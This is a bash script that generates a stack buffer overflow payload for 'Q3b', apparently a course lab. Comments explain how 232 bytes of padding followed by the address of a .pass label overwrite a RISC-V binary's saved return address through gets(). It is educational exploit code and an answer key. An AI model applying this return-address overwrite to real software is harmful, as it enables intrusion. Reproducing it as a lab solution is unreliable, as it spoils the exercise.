#!/bin/bash
# ==========================================================================
# Q3b payload generator
#
# Regenerates the buffer overflow payload for Q3b.
# This is useful if you need to understand or tweak the exploit.
#
# HOW THE EXPLOIT WORKS:
#   The target binary's main() function does this:
#     1. addi sp, sp, -16       → save ra at sp+8, s0 at sp+0
#     2. addi sp, sp, -224      → allocate 224-byte buffer on stack
#     3. gets(buffer)            → reads stdin into the 224-byte buffer
#                                  *** gets() has NO bounds checking! ***
#     4. bnez a0, .fail          → gets() always returns non-NULL, so this
#                                  ALWAYS jumps to .fail — there's no way
#                                  to pass normally!
#
#   The stack looks like this (growing downward):
#     [224 bytes: char buffer]  ← gets() writes here
#     [8 bytes: saved s0]       ← frame pointer
#     [8 bytes: saved ra]       ← return address ← WE OVERWRITE THIS
#
#   By writing 224 + 8 = 232 bytes of junk, then the address of .pass
#   (0x104e8), we overwrite the saved return address. When main() executes
#   'ret', it jumps to .pass instead of the real caller, printing
#   "You have passed!".
#
# Usage: ./gen_payload_q3b.sh
# ==========================================================================

set -e
BASE=$(cd "$(dirname "$0")" && pwd)
OUTPUT="$BASE/q3/b/payload"

python3 -c "
import sys

BUFFER_SIZE = 224        # size of the local char array
SAVED_S0    = 8          # saved frame pointer (s0) — we don't care about its value
PASS_ADDR   = 0x104e8    # address of .pass label (found via objdump)

padding     = b'A' * BUFFER_SIZE           # fill the buffer
fake_s0     = b'B' * SAVED_S0              # overwrite saved s0 (junk is fine)
target_ra   = PASS_ADDR.to_bytes(8, 'little')  # overwrite ra with .pass address

payload = padding + fake_s0 + target_ra
sys.stdout.buffer.write(payload)
" > "$OUTPUT"

echo "Payload written to $OUTPUT"
echo "Size: $(wc -c < "$OUTPUT") bytes (expected: 240)"
echo "Hex dump of last 16 bytes:"
xxd "$OUTPUT" | tail -1
